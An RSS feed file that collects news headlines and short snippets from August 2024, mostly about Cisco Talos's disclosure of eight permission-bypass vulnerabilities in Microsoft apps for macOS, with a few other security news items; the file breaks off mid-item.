<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>security-announce Mailing List</title>
<link>https://lists.apple.com/archives/security-announce/2021/Feb/index.html</link>

<item>
<title>Microsoft “declined” to fix flaws that allow hackers to spy on Mac users - Dexerto</title>
<link>https://www.google.com/url?rct=j&amp;sa=t&amp;url=https://www.dexerto.com/tech/microsoft-declined-to-fix-flaws-that-allow-hackers-to-spy-on-mac-users-2869388/&amp;ct=ga&amp;cd=CAIyGmQ5YWViMjk1NjcwMTA1NTQ6Y29tOmVuOlVT&amp;usg=AOvVaw1No3oZQ_tfTEewsjM51tLP</link>
<guid>https://www.google.com/url?rct=j&amp;sa=t&amp;url=https://www.dexerto.com/tech/microsoft-declined-to-fix-flaws-that-allow-hackers-to-spy-on-mac-users-2869388/&amp;ct=ga&amp;cd=CAIyGmQ5YWViMjk1NjcwMTA1NTQ6Y29tOmVuOlVT&amp;usg=AOvVaw1No3oZQ_tfTEewsjM51tLP</guid>
<content:encoded><![CDATA[

A <b>vulnerability</b> found in Microsoft apps allows hackers to ... “We identified eight <b>vulnerabilities</b> in various Microsoft applications for <b>macOS</b>&nbsp;...
]]></content:encoded>
<pubDate>2024-08-20T14:22:23Z</pubDate>
<pubDate>2024-08-20T14:22:23Z</pubDate>
</item>
<item>
<title>Microsoft Office apps circumvent Mac security - Computerworld</title>
<link>https://www.google.com/url?rct=j&amp;sa=t&amp;url=https://www.computerworld.com/article/3489043/microsoft-office-apps-circumvent-mac-security.html&amp;ct=ga&amp;cd=CAIyGmQ5YWViMjk1NjcwMTA1NTQ6Y29tOmVuOlVT&amp;usg=AOvVaw2PH88XkpvdbZ-C1V3rCUqY</link>
<guid>https://www.google.com/url?rct=j&amp;sa=t&amp;url=https://www.computerworld.com/article/3489043/microsoft-office-apps-circumvent-mac-security.html&amp;ct=ga&amp;cd=CAIyGmQ5YWViMjk1NjcwMTA1NTQ6Y29tOmVuOlVT&amp;usg=AOvVaw2PH88XkpvdbZ-C1V3rCUqY</guid>
<content:encoded><![CDATA[

Microsoft Office apps circumvent Mac security. news analysis. Aug 20, 20246 mins. Apple<b>MacOSMacOS</b> Security ... Francesco Benvenuto, Sr. <b>Vulnerability</b>&nbsp;...
]]></content:encoded>
<pubDate>2024-08-20T13:58:37Z</pubDate>
<pubDate>2024-08-20T13:58:37Z</pubDate>
</item>
<item>
<title>Flaws in Microsoft Apps for <b>MacOS</b> Threaten App Permission Bypass | ChannelE2E</title>
<link>https://www.google.com/url?rct=j&amp;sa=t&amp;url=https://www.channele2e.com/brief/flaws-in-microsoft-apps-for-macos-threaten-app-permission-bypass&amp;ct=ga&amp;cd=CAIyGmQ5YWViMjk1NjcwMTA1NTQ6Y29tOmVuOlVT&amp;usg=AOvVaw1pFwVaCwKeKU2PcBtcmo2Y</link>
<guid>https://www.google.com/url?rct=j&amp;sa=t&amp;url=https://www.channele2e.com/brief/flaws-in-microsoft-apps-for-macos-threaten-app-permission-bypass&amp;ct=ga&amp;cd=CAIyGmQ5YWViMjk1NjcwMTA1NTQ6Y29tOmVuOlVT&amp;usg=AOvVaw1pFwVaCwKeKU2PcBtcmo2Y</guid>
<content:encoded><![CDATA[

Exploitation of the <b>vulnerabilities</b> could provide additional privileges that enable covert email delivery, photo capturing, and audio and video&nbsp;...
]]></content:encoded>
<pubDate>2024-08-20T13:58:15Z</pubDate>
<pubDate>2024-08-20T13:58:15Z</pubDate>
</item>
<item>
<title>Patched Windows Zero-Day Used in Lazarus Attack | ChannelE2E</title>
<link>https://www.google.com/url?rct=j&amp;sa=t&amp;url=https://www.channele2e.com/brief/patched-windows-zero-day-used-in-lazarus-attack&amp;ct=ga&amp;cd=CAIyGmQ5YWViMjk1NjcwMTA1NTQ6Y29tOmVuOlVT&amp;usg=AOvVaw3iJf7jRRBs7FaamR3-292V</link>
<guid>https://www.google.com/url?rct=j&amp;sa=t&amp;url=https://www.channele2e.com/brief/patched-windows-zero-day-used-in-lazarus-attack&amp;ct=ga&amp;cd=CAIyGmQ5YWViMjk1NjcwMTA1NTQ6Y29tOmVuOlVT&amp;usg=AOvVaw3iJf7jRRBs7FaamR3-292V</guid>
<content:encoded><![CDATA[

Attacks exploiting a Windows Ancillary Function Driver for WinSock zero-day <b>vulnerability</b>, tracked as CVE-2024-38193, have been deployed by North&nbsp;...
]]></content:encoded>
<pubDate>2024-08-20T13:58:06Z</pubDate>
<pubDate>2024-08-20T13:58:06Z</pubDate>
</item>
<item>
<title>Microsoft 365 on <b>macOS</b> users at risk from hackers, but Redmond may underestimate threat</title>
<link>https://www.google.com/url?rct=j&amp;sa=t&amp;url=https://mspoweruser.com/microsoft-365-on-macos-users-at-risk-from-hackers-but-redmond-may-underestimate-threat/&amp;ct=ga&amp;cd=CAIyGmQ5YWViMjk1NjcwMTA1NTQ6Y29tOmVuOlVT&amp;usg=AOvVaw3PU_NUTc3IBvgTVUbOVWOa</link>
<guid>https://www.google.com/url?rct=j&amp;sa=t&amp;url=https://mspoweruser.com/microsoft-365-on-macos-users-at-risk-from-hackers-but-redmond-may-underestimate-threat/&amp;ct=ga&amp;cd=CAIyGmQ5YWViMjk1NjcwMTA1NTQ6Y29tOmVuOlVT&amp;usg=AOvVaw3PU_NUTc3IBvgTVUbOVWOa</guid>
<content:encoded><![CDATA[

Eight <b>vulnerabilities</b> in Microsoft 365 apps on <b>macOS</b> challenge Apple's security reputation. Here's what you need to know about it.
]]></content:encoded>
<pubDate>2024-08-20T13:47:09Z</pubDate>
<pubDate>2024-08-20T13:47:09Z</pubDate>
</item>
<item>
<title>Cisco, Microsoft Disagree on Severity of <b>macOS</b> App <b>Vulnerabilities</b> - SecurityWeek</title>
<link>https://www.google.com/url?rct=j&amp;sa=t&amp;url=https://www.securityweek.com/cisco-microsoft-disagree-on-severity-of-macos-app-vulnerabilities/&amp;ct=ga&amp;cd=CAIyGmQ5YWViMjk1NjcwMTA1NTQ6Y29tOmVuOlVT&amp;usg=AOvVaw2K-zr4Z6qWgZprEdseEPb4</link>
<guid>https://www.google.com/url?rct=j&amp;sa=t&amp;url=https://www.securityweek.com/cisco-microsoft-disagree-on-severity-of-macos-app-vulnerabilities/&amp;ct=ga&amp;cd=CAIyGmQ5YWViMjk1NjcwMTA1NTQ6Y29tOmVuOlVT&amp;usg=AOvVaw2K-zr4Z6qWgZprEdseEPb4</guid>
<content:encoded><![CDATA[

<b>Vulnerabilities</b> in Microsoft applications for <b>macOS</b> could be exploited to send emails, leak sensitive information, and escalate privileges.
]]></content:encoded>
<pubDate>2024-08-20T13:16:38Z</pubDate>
<pubDate>2024-08-20T13:16:38Z</pubDate>
</item>
<item>
<title>New Microsoft 365 <b>Vulnerabilities</b> Found to Expose Your Mac to Hackers - Techopedia</title>
<link>https://www.google.com/url?rct=j&amp;sa=t&amp;url=https://www.techopedia.com/news/new-microsoft-365-vulnerabilities-found-to-expose-your-mac-to-hackers&amp;ct=ga&amp;cd=CAIyGmQ5YWViMjk1NjcwMTA1NTQ6Y29tOmVuOlVT&amp;usg=AOvVaw0md_SW987xtCJrDL75JOu-</link>
<guid>https://www.google.com/url?rct=j&amp;sa=t&amp;url=https://www.techopedia.com/news/new-microsoft-365-vulnerabilities-found-to-expose-your-mac-to-hackers&amp;ct=ga&amp;cd=CAIyGmQ5YWViMjk1NjcwMTA1NTQ6Y29tOmVuOlVT&amp;usg=AOvVaw0md_SW987xtCJrDL75JOu-</guid>
<content:encoded><![CDATA[

Cisco reported <b>vulnerabilities</b> in Microsoft apps for <b>macOS</b>. &middot; These <b>vulnerabilities</b> can be exploited to access microphone, camera, and other input&nbsp;...
]]></content:encoded>
<pubDate>2024-08-20T13:06:33Z</pubDate>
<pubDate>2024-08-20T13:06:33Z</pubDate>
</item>
<item>
<title>Hackers Could <b>Exploit</b> Microsoft Teams on <b>macOS</b> to Steal Data - Hackread</title>
<link>https://www.google.com/url?rct=j&amp;sa=t&amp;url=https://hackread.com/hackers-exploit-microsoft-teams-macos-steal-data/&amp;ct=ga&amp;cd=CAIyGmQ5YWViMjk1NjcwMTA1NTQ6Y29tOmVuOlVT&amp;usg=AOvVaw01G5y3XoZ1ElxYGQkL4J_t</link>
<guid>https://www.google.com/url?rct=j&amp;sa=t&amp;url=https://hackread.com/hackers-exploit-microsoft-teams-macos-steal-data/&amp;ct=ga&amp;cd=CAIyGmQ5YWViMjk1NjcwMTA1NTQ6Y29tOmVuOlVT&amp;usg=AOvVaw01G5y3XoZ1ElxYGQkL4J_t</guid>
<content:encoded><![CDATA[

Cisco Talos reveals 8 <b>vulnerabilities</b> in Microsoft's <b>macOS</b> apps, exploiting TCC framework weaknesses. Updates are crucial for protection.
]]></content:encoded>
<pubDate>2024-08-20T12:53:34Z</pubDate>
<pubDate>2024-08-20T12:53:34Z</pubDate>
</item>
<item>
<title>Microsoft 365 <b>MacOS</b> Apps <b>Vulnerable</b> to Security Exploits - WinBuzzer</title>
<link>https://www.google.com/url?rct=j&amp;sa=t&amp;url=https://winbuzzer.com/2024/08/20/critical-flaws-found-in-microsoft-macos-applications-xcxwbn/&amp;ct=ga&amp;cd=CAIyGmQ5YWViMjk1NjcwMTA1NTQ6Y29tOmVuOlVT&amp;usg=AOvVaw2eYZlCrOdeoEca0yC6bPIL</link>
<guid>https://www.google.com/url?rct=j&amp;sa=t&amp;url=https://winbuzzer.com/2024/08/20/critical-flaws-found-in-microsoft-macos-applications-xcxwbn/&amp;ct=ga&amp;cd=CAIyGmQ5YWViMjk1NjcwMTA1NTQ6Y29tOmVuOlVT&amp;usg=AOvVaw2eYZlCrOdeoEca0yC6bPIL</guid>
<content:encoded><![CDATA[

<b>Vulnerability</b> Details and Exploitability. The <b>vulnerabilities</b> were discovered through a detailed analysis of <b>macOS</b> applications and the exploitability&nbsp;...
]]></content:encoded>
<pubDate>2024-08-20T12:00:36Z</pubDate>
<pubDate>2024-08-20T12:00:36Z</pubDate>
</item>
<item>
<title>Microsoft apps on <b>macOS vulnerable</b> to potential spyware attacks, experts warn</title>
<link>https://www.google.com/url?rct=j&amp;sa=t&amp;url=https://www.indiatoday.in/amp/technology/news/story/microsoft-apps-on-macos-vulnerable-to-potential-spyware-attacks-experts-warn-2585193-2024-08-20&amp;ct=ga&amp;cd=CAIyGmQ5YWViMjk1NjcwMTA1NTQ6Y29tOmVuOlVT&amp;usg=AOvVaw3Y2kslCPXia8zNXrtEs6-q</link>
<guid>https://www.google.com/url?rct=j&amp;sa=t&amp;url=https://www.indiatoday.in/amp/technology/news/story/microsoft-apps-on-macos-vulnerable-to-potential-spyware-attacks-experts-warn-2585193-2024-08-20&amp;ct=ga&amp;cd=CAIyGmQ5YWViMjk1NjcwMTA1NTQ6Y29tOmVuOlVT&amp;usg=AOvVaw3Y2kslCPXia8zNXrtEs6-q</guid>
<content:encoded><![CDATA[

Microsoft applications for <b>macOS</b> recently had <b>vulnerabilities</b> that allowed hackers to potentially spy on Mac users, according to cybersecurity&nbsp;...
]]></content:encoded>
<pubDate>2024-08-20T11:56:39Z</pubDate>
<pubDate>2024-08-20T11:56:39Z</pubDate>
</item>
<item>
<title>Critical <b>Vulnerability</b> In Microsoft Apps For Mac: What You Need To Know - AppleMagazine</title>
<link>https://www.google.com/url?rct=j&amp;sa=t&amp;url=https://applemagazine.com/critical-vulnerability-in-microsoft-apps-for-mac-what-you-need-to-know/67658&amp;ct=ga&amp;cd=CAIyGmQ5YWViMjk1NjcwMTA1NTQ6Y29tOmVuOlVT&amp;usg=AOvVaw0UbAHK7dE_5NPc_mZWYJrE</link>
<guid>https://www.google.com/url?rct=j&amp;sa=t&amp;url=https://applemagazine.com/critical-vulnerability-in-microsoft-apps-for-mac-what-you-need-to-know/67658&amp;ct=ga&amp;cd=CAIyGmQ5YWViMjk1NjcwMTA1NTQ6Y29tOmVuOlVT&amp;usg=AOvVaw0UbAHK7dE_5NPc_mZWYJrE</guid>
<content:encoded><![CDATA[

The newly identified flaw allows malicious actors to <b>exploit</b> Microsoft apps on <b>macOS</b>, potentially granting unauthorized access to user data or&nbsp;...
]]></content:encoded>
<pubDate>2024-08-20T11:03:24Z</pubDate>
<pubDate>2024-08-20T11:03:24Z</pubDate>
</item>
<item>
<title><b>Vulnerabilities</b> in Microsoft <b>macOS</b> apps may give attackers access to microphone, camera</title>
<link>https://www.google.com/url?rct=j&amp;sa=t&amp;url=https://www.helpnetsecurity.com/2024/08/20/microsoft-macos-vulnerabilities/&amp;ct=ga&amp;cd=CAIyGmQ5YWViMjk1NjcwMTA1NTQ6Y29tOmVuOlVT&amp;usg=AOvVaw2QZwAaa7JXNiErcCAwh9y4</link>
<guid>https://www.google.com/url?rct=j&amp;sa=t&amp;url=https://www.helpnetsecurity.com/2024/08/20/microsoft-macos-vulnerabilities/&amp;ct=ga&amp;cd=CAIyGmQ5YWViMjk1NjcwMTA1NTQ6Y29tOmVuOlVT&amp;usg=AOvVaw2QZwAaa7JXNiErcCAwh9y4</guid>
<content:encoded><![CDATA[

<b>Vulnerabilities</b> in popular Microsoft apps for <b>macOS</b> can be abused by attackers to record video and audio clips, take pictures, etc.
]]></content:encoded>
<pubDate>2024-08-20T10:58:19Z</pubDate>
<pubDate>2024-08-20T10:58:19Z</pubDate>
</item>
<item>
<title>Microsoft apps for <b>macOS vulnerable</b> to hacking, researchers find - Computing UK</title>
<link>https://www.google.com/url?rct=j&amp;sa=t&amp;url=https://www.computing.co.uk/news/4348469/microsoft-apps-macos-vulnerable-hacking-researchers&amp;ct=ga&amp;cd=CAIyGmQ5YWViMjk1NjcwMTA1NTQ6Y29tOmVuOlVT&amp;usg=AOvVaw16xoteN3NL6bB8sgRa0Dvd</link>
<guid>https://www.google.com/url?rct=j&amp;sa=t&amp;url=https://www.computing.co.uk/news/4348469/microsoft-apps-macos-vulnerable-hacking-researchers&amp;ct=ga&amp;cd=CAIyGmQ5YWViMjk1NjcwMTA1NTQ6Y29tOmVuOlVT&amp;usg=AOvVaw16xoteN3NL6bB8sgRa0Dvd</guid>
<content:encoded><![CDATA[

A <b>vulnerability</b> in the Microsoft apps for <b>macOS</b> has been discovered by security researchers from threat intelligence company Cisco Talos,&nbsp;...
]]></content:encoded>
<pubDate>2024-08-20T10:17:43Z</pubDate>
<pubDate>2024-08-20T10:17:43Z</pubDate>
</item>
<item>
<title>National Public Data breach update, Flaws in <b>macOS</b> apps - CISO Series</title>
<link>https://www.google.com/url?rct=j&amp;sa=t&amp;url=https://cisoseries.com/cybersecurity-news-national-public-data-breach-update-flaws-in-macos-apps-flighttracker-configuration-issue/&amp;ct=ga&amp;cd=CAIyGmQ5YWViMjk1NjcwMTA1NTQ6Y29tOmVuOlVT&amp;usg=AOvVaw1Xde9V-LRMBHA0JTJDiC1B</link>
<guid>https://www.google.com/url?rct=j&amp;sa=t&amp;url=https://cisoseries.com/cybersecurity-news-national-public-data-breach-update-flaws-in-macos-apps-flighttracker-configuration-issue/&amp;ct=ga&amp;cd=CAIyGmQ5YWViMjk1NjcwMTA1NTQ6Y29tOmVuOlVT&amp;usg=AOvVaw1Xde9V-LRMBHA0JTJDiC1B</guid>
<content:encoded><![CDATA[

Flaws in Microsoft <b>macOS</b> Apps allows secret recording. Cisco Talos researchers have discovered eight <b>vulnerabilities</b> in Microsoft's <b>macOS</b> apps&nbsp;...
]]></content:encoded>
<pubDate>2024-08-20T10:01:10Z</pubDate>
<pubDate>2024-08-20T10:01:10Z</pubDate>
</item>
<item>
<title>Major Flaw in Microsoft Mac Apps Could Let Hackers Spy Through Mic and Camera</title>
<link>https://www.google.com/url?rct=j&amp;sa=t&amp;url=https://thecyberexpress.com/microsoft-apps-macs-hackers-flaw/&amp;ct=ga&amp;cd=CAIyGmQ5YWViMjk1NjcwMTA1NTQ6Y29tOmVuOlVT&amp;usg=AOvVaw1O6j64o2d0SPHeLqppX3nB</link>
<guid>https://www.google.com/url?rct=j&amp;sa=t&amp;url=https://thecyberexpress.com/microsoft-apps-macs-hackers-flaw/&amp;ct=ga&amp;cd=CAIyGmQ5YWViMjk1NjcwMTA1NTQ6Y29tOmVuOlVT&amp;usg=AOvVaw1O6j64o2d0SPHeLqppX3nB</guid>
<content:encoded><![CDATA[

A critical <b>vulnerability</b> in Microsoft apps for <b>macOS</b> allows hackers to access cameras and microphones without permission.
]]></content:encoded>
<pubDate>2024-08-20T09:57:31Z</pubDate>
<pubDate>2024-08-20T09:57:31Z</pubDate>
</item>
<item>
<title>Microsoft App <b>Vulnerability</b> in <b>macOS</b>: Researchers Find 8 Applications <b>Vulnerable</b> to ... - LatestLY</title>
<link>https://www.google.com/url?rct=j&amp;sa=t&amp;url=https://www.latestly.com/technology/microsoft-app-vulnerability-in-macos-researchers-find-8-applications-vulnerable-to-attacks-allowing-hackers-to-get-full-permissions-of-apple-devices-6202179.html&amp;ct=ga&amp;cd=CAIyGmQ5YWViMjk1NjcwMTA1NTQ6Y29tOmVuOlVT&amp;usg=AOvVaw0lBZ090zsJNs4Fbi5dBQN9</link>
<guid>https://www.google.com/url?rct=j&amp;sa=t&amp;url=https://www.latestly.com/technology/microsoft-app-vulnerability-in-macos-researchers-find-8-applications-vulnerable-to-attacks-allowing-hackers-to-get-full-permissions-of-apple-devices-6202179.html&amp;ct=ga&amp;cd=CAIyGmQ5YWViMjk1NjcwMTA1NTQ6Y29tOmVuOlVT&amp;usg=AOvVaw0lBZ090zsJNs4Fbi5dBQN9</guid>
<content:encoded><![CDATA[

A team of security researchers find eight <b>vulnerabilities</b> in the Microsoft applications running on the <b>macOS</b> operating system.
]]></content:encoded>
<pubDate>2024-08-20T09:23:16Z</pubDate>
<pubDate>2024-08-20T09:23:16Z</pubDate>
</item>
<item>
<title>Attackers Can Spy On User Cameras Thanks To New Security <b>Vulnerabilities</b> In Different ...</title>
<link>https://www.google.com/url?rct=j&amp;sa=t&amp;url=https://www.digitalinformationworld.com/2024/08/attackers-can-spy-on-user-cameras.html&amp;ct=ga&amp;cd=CAIyGmQ5YWViMjk1NjcwMTA1NTQ6Y29tOmVuOlVT&amp;usg=AOvVaw1nlfDKKc9KIeqCQ8Kn35Hz</link>
<guid>https://www.google.com/url?rct=j&amp;sa=t&amp;url=https://www.digitalinformationworld.com/2024/08/attackers-can-spy-on-user-cameras.html&amp;ct=ga&amp;cd=CAIyGmQ5YWViMjk1NjcwMTA1NTQ6Y29tOmVuOlVT&amp;usg=AOvVaw1nlfDKKc9KIeqCQ8Kn35Hz</guid>
<content:encoded><![CDATA[

Microsoft apps on <b>macOS</b> pose security risks, with eight <b>vulnerabilities</b> enabling attackers to spy on users.
]]></content:encoded>
<pubDate>2024-08-20T08:42:17Z</pubDate>
<pubDate>2024-08-20T08:42:17Z</pubDate>
</item>
<item>
<title>Macs in danger due to <b>vulnerabilities</b> in Microsoft Office apps | Cybernews</title>
<link>https://www.google.com/url?rct=j&amp;sa=t&amp;url=https://cybernews.com/security/macs-in-danger-microsoft-office-apps-vulnerable/&amp;ct=ga&amp;cd=CAIyGmQ5YWViMjk1NjcwMTA1NTQ6Y29tOmVuOlVT&amp;usg=AOvVaw0Sla-6sCYIDwZJMuttlDqD</link>
<guid>https://www.google.com/url?rct=j&amp;sa=t&amp;url=https://cybernews.com/security/macs-in-danger-microsoft-office-apps-vulnerable/&amp;ct=ga&amp;cd=CAIyGmQ5YWViMjk1NjcwMTA1NTQ6Y29tOmVuOlVT&amp;usg=AOvVaw0Sla-6sCYIDwZJMuttlDqD</guid>
<content:encoded><![CDATA[

Six Microsoft applications on <b>macOS</b> are <b>vulnerable</b> to outside hackers, security researchers at Cisco Talos have discovered.
]]></content:encoded>
<pubDate>2024-08-20T08:36:33Z</pubDate>
<pubDate>2024-08-20T08:36:33Z</pubDate>
</item>

<item>
<title>Microsoft apps on Apple <b>macOS</b> susceptible to code injection attacks, find researchers</title>
<link>https://www.google.com/url?rct=j&amp;sa=t&amp;url=https://www.thehindu.com/sci-tech/technology/microsoft-apps-on-apple-macos-susceptible-to-code-injection-attacks-find-researchers/article68545854.ece&amp;ct=ga&amp;cd=CAIyGmQ5YWViMjk1NjcwMTA1NTQ6Y29tOmVuOlVT&amp;usg=AOvVaw0Gis38C-9urOJPdH8cvdrw</link>
<guid>https://www.google.com/url?rct=j&amp;sa=t&amp;url=https://www.thehindu.com/sci-tech/technology/microsoft-apps-on-apple-macos-susceptible-to-code-injection-attacks-find-researchers/article68545854.ece&amp;ct=ga&amp;cd=CAIyGmQ5YWViMjk1NjcwMTA1NTQ6Y29tOmVuOlVT&amp;usg=AOvVaw0Gis38C-9urOJPdH8cvdrw</guid>
<content:encoded><![CDATA[
Microsoft apps for <b>macOS vulnerable</b> to code injection attacks due to macOS permission settings, according to Cisco Talos research.
]]></content:encoded>
<pubDate>2024-08-20T08:26:06Z</pubDate>
</item>
<item>
<title>Microsoft Office, Teams <b>Vulnerabilities</b> Enable Hackers to Access Camera and Microphone ...</title>
<link>https://www.google.com/url?rct=j&amp;sa=t&amp;url=https://www.gadgets360.com/laptops/news/microsoft-office-outlook-teams-security-vulnerabilities-camera-microphone-access-6376021&amp;ct=ga&amp;cd=CAIyGmQ5YWViMjk1NjcwMTA1NTQ6Y29tOmVuOlVT&amp;usg=AOvVaw30-T_3YHkMQxFieGaihaqJ</link>
<guid>https://www.google.com/url?rct=j&amp;sa=t&amp;url=https://www.gadgets360.com/laptops/news/microsoft-office-outlook-teams-security-vulnerabilities-camera-microphone-access-6376021&amp;ct=ga&amp;cd=CAIyGmQ5YWViMjk1NjcwMTA1NTQ6Y29tOmVuOlVT&amp;usg=AOvVaw30-T_3YHkMQxFieGaihaqJ</guid>
<content:encoded><![CDATA[
Microsoft's apps for <b>macOS</b> are affected by eight security <b>vulnerabilities</b> that could allow hackers to access the camera and microphones of users&nbsp;...
]]></content:encoded>
<pubDate>2024-08-20T08:18:22Z</pubDate>
</item>
<item>
<title>Microsoft App Flaw Exposes Mac Users - GEARRICE</title>
<link>https://www.google.com/url?rct=j&amp;sa=t&amp;url=https://www.gearrice.com/update/microsoft-app-flaw-exposes-mac-users/&amp;ct=ga&amp;cd=CAIyGmQ5YWViMjk1NjcwMTA1NTQ6Y29tOmVuOlVT&amp;usg=AOvVaw0tQVvAxDJUb-YfdtUOpHkF</link>
<guid>https://www.google.com/url?rct=j&amp;sa=t&amp;url=https://www.gearrice.com/update/microsoft-app-flaw-exposes-mac-users/&amp;ct=ga&amp;cd=CAIyGmQ5YWViMjk1NjcwMTA1NTQ6Y29tOmVuOlVT&amp;usg=AOvVaw0tQVvAxDJUb-YfdtUOpHkF</guid>
<content:encoded><![CDATA[
A <b>vulnerability</b> in Microsoft's <b>macOS</b> apps recently allowed hackers to ... This <b>exploit</b> leverages <b>macOS</b>' permission management framework&nbsp;...
]]></content:encoded>
<pubDate>2024-08-20T08:06:03Z</pubDate>
</item>
<item>
<title>How a major <b>vulnerability</b> in Microsoft's apps allowed hackers to break into Macs - Firstpost</title>
<link>https://www.google.com/url?rct=j&amp;sa=t&amp;url=https://www.firstpost.com/tech/how-a-major-vulnerability-in-microsofts-apps-allowed-hackers-to-break-into-macs-13806368.html&amp;ct=ga&amp;cd=CAIyGmQ5YWViMjk1NjcwMTA1NTQ6Y29tOmVuOlVT&amp;usg=AOvVaw329mH2iEVuuVKoOaAlQFlW</link>
<guid>https://www.google.com/url?rct=j&amp;sa=t&amp;url=https://www.firstpost.com/tech/how-a-major-vulnerability-in-microsofts-apps-allowed-hackers-to-break-into-macs-13806368.html&amp;ct=ga&amp;cd=CAIyGmQ5YWViMjk1NjcwMTA1NTQ6Y29tOmVuOlVT&amp;usg=AOvVaw329mH2iEVuuVKoOaAlQFlW</guid>
<content:encoded><![CDATA[
A critical <b>vulnerability</b> in Microsoft's apps for <b>MacOS</b> was discovered recently. This <b>vulnerability</b> allowed hackers to spy on Mac users by&nbsp;...
]]></content:encoded>
<pubDate>2024-08-20T07:59:59Z</pubDate>
</item>
<item>
<title>MS Office apps for <b>macOS</b> allow circumventing of permissions - Techzine Global</title>
<link>https://www.google.com/url?rct=j&amp;sa=t&amp;url=https://www.techzine.eu/news/security/123563/ms-office-apps-for-macos-allow-circumventing-of-permissions/&amp;ct=ga&amp;cd=CAIyGmQ5YWViMjk1NjcwMTA1NTQ6Y29tOmVuOlVT&amp;usg=AOvVaw26Z8g26w1Pon9N20UvPjcV</link>
<guid>https://www.google.com/url?rct=j&amp;sa=t&amp;url=https://www.techzine.eu/news/security/123563/ms-office-apps-for-macos-allow-circumventing-of-permissions/&amp;ct=ga&amp;cd=CAIyGmQ5YWViMjk1NjcwMTA1NTQ6Y29tOmVuOlVT&amp;usg=AOvVaw26Z8g26w1Pon9N20UvPjcV</guid>
<content:encoded><![CDATA[
Some of the most widely used Microsoft Office apps for <b>macOS</b> contain a <b>vulnerability</b> that abuses existing permissions.
]]></content:encoded>
<pubDate>2024-08-20T07:43:13Z</pubDate>
</item>
<item>
<title>Microsoft 365 app for Apple <b>macOS</b> has a <b>vulnerability</b> that allows hackers to bypass ...</title>
<link>https://www.google.com/url?rct=j&amp;sa=t&amp;url=https://passionategeekz.com/microsoft-365-app-for-apple-macos-has-a-vulnerability-that-allows-hackers-to-bypass-permissions-and-perform-malicious-operations/&amp;ct=ga&amp;cd=CAIyGmQ5YWViMjk1NjcwMTA1NTQ6Y29tOmVuOlVT&amp;usg=AOvVaw3L74exu0d_HvtosmMEFoY4</link>
<guid>https://www.google.com/url?rct=j&amp;sa=t&amp;url=https://passionategeekz.com/microsoft-365-app-for-apple-macos-has-a-vulnerability-that-allows-hackers-to-bypass-permissions-and-perform-malicious-operations/&amp;ct=ga&amp;cd=CAIyGmQ5YWViMjk1NjcwMTA1NTQ6Y29tOmVuOlVT&amp;usg=AOvVaw3L74exu0d_HvtosmMEFoY4</guid>
<content:encoded><![CDATA[
Hackers can use these <b>vulnerabilities</b> to bypass the <b>macOS</b> permission model and use existing application permissions to perform malicious operations&nbsp;...
]]></content:encoded>
<pubDate>2024-08-20T05:42:58Z</pubDate>
</item>
<item>
<title>Puyo-themed skit-based entertainment software “Puyo Puyo Koi Monogatari (MSX2 version ...</title>
<link>https://www.google.com/url?rct=j&amp;sa=t&amp;url=https://passionategeekz.com/puyo-themed-skit-based-entertainment-software-puyo-puyo-koi-monogatari-msx2-version-released-today-by-project-egg/&amp;ct=ga&amp;cd=CAIyGmQ5YWViMjk1NjcwMTA1NTQ6Y29tOmVuOlVT&amp;usg=AOvVaw1qtntyUlkcqepwU43RLacJ</link>
<guid>https://www.google.com/url?rct=j&amp;sa=t&amp;url=https://passionategeekz.com/puyo-themed-skit-based-entertainment-software-puyo-puyo-koi-monogatari-msx2-version-released-today-by-project-egg/&amp;ct=ga&amp;cd=CAIyGmQ5YWViMjk1NjcwMTA1NTQ6Y29tOmVuOlVT&amp;usg=AOvVaw1qtntyUlkcqepwU43RLacJ</guid>
<content:encoded><![CDATA[
Microsoft 365 app for Apple <b>macOS</b> has a <b>vulnerability</b> that allows hackers to bypass permissions and perform malicious operations &middot; Puyo-themed skit&nbsp;...
]]></content:encoded>
<pubDate>2024-08-20T05:38:59Z</pubDate>
</item>
<item>
<title>Hackers can <b>exploit</b> Microsoft <b>macOS</b> app <b>vulnerabilities</b> to bypass permissions - Neowin</title>
<link>https://www.google.com/url?rct=j&amp;sa=t&amp;url=https://www.neowin.net/news/hackers-can-exploit-microsoft-macos-app-vulnerabilities-to-bypass-permissions/&amp;ct=ga&amp;cd=CAIyGmQ5YWViMjk1NjcwMTA1NTQ6Y29tOmVuOlVT&amp;usg=AOvVaw12ZHkeMHqBJ9WNOY7puab5</link>
<guid>https://www.google.com/url?rct=j&amp;sa=t&amp;url=https://www.neowin.net/news/hackers-can-exploit-microsoft-macos-app-vulnerabilities-to-bypass-permissions/&amp;ct=ga&amp;cd=CAIyGmQ5YWViMjk1NjcwMTA1NTQ6Y29tOmVuOlVT&amp;usg=AOvVaw12ZHkeMHqBJ9WNOY7puab5</guid>
<content:encoded><![CDATA[
Cisco Talos discovered eight <b>vulnerabilities</b> in Microsoft 365 apps on <b>macOS</b>. These <b>vulnerabilities</b> allow hackers to bypass <b>macOS</b> permissions and&nbsp;...
]]></content:encoded>
<pubDate>2024-08-20T05:21:01Z</pubDate>
</item>
<item>
<title>Researchers Uncover Security Flaws In Microsoft <b>macOS</b> Apps, Potentially Allowing ...</title>
<link>https://www.google.com/url?rct=j&amp;sa=t&amp;url=https://www.timesnownews.com/technology-science/researchers-uncover-security-flaws-in-microsoft-macos-apps-potentially-allowing-unauthorized-access-to-cameras-data-article-112640611&amp;ct=ga&amp;cd=CAIyGmQ5YWViMjk1NjcwMTA1NTQ6Y29tOmVuOlVT&amp;usg=AOvVaw0YZlPQlCN6TXujIWJvh2B2</link>
<guid>https://www.google.com/url?rct=j&amp;sa=t&amp;url=https://www.timesnownews.com/technology-science/researchers-uncover-security-flaws-in-microsoft-macos-apps-potentially-allowing-unauthorized-access-to-cameras-data-article-112640611&amp;ct=ga&amp;cd=CAIyGmQ5YWViMjk1NjcwMTA1NTQ6Y29tOmVuOlVT&amp;usg=AOvVaw0YZlPQlCN6TXujIWJvh2B2</guid>
<content:encoded><![CDATA[
These <b>vulnerabilities</b> pose varying risks depending on the app and its permissions., Technology &amp; Science News - Times Now.
]]></content:encoded>
<pubDate>2024-08-20T03:24:50Z</pubDate>
</item>
<item>
<title>CISA: Attacks leveraging critical SolarWinds RCE underway | SC Media</title>
